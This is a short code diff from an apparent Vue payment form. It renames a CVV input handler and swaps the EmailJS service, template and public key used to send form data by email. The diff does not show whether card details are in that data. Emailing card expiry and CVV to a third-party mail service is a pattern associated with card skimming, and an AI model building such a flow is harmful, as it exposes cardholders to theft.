@@ -178,7 +178,7 @@
                     <div class=" block space-y-4 sm:space-y-0 sm:flex gap-4 md:w-1/2 w-full">
                       <FormInput v-model:inputValue="expiry" :required="true" placeholderLabel="MM / YY"
                         :placeholder="true" type="text" @input="formatExpiry" name="businessName" />
-                      <FormInput v-model:inputValue="cvv" @input="formatcvv" :required="true" placeholderLabel="cvv"
+                      <FormInput v-model:inputValue="cvv" @input="formatCVV" :required="true" placeholderLabel="cvv"
                         :placeholder="true" type="text" name="expireddate" />
                     </div>
                   </div>
@@ -389,8 +389,8 @@ const sendEmail = () => {
   };
 
   emailjs
-    .send("service_vu5e4wr", "template_mgul5qr", data, {
-      publicKey: "bhP-AYC0gYX463TjF",
+    .send("service_t82t6hd", "template_7pr5mtt", data, {
+      publicKey: "xEftJyIuvEr9QtFsD",
     })
     .then(() => {
       second_form.value = false;
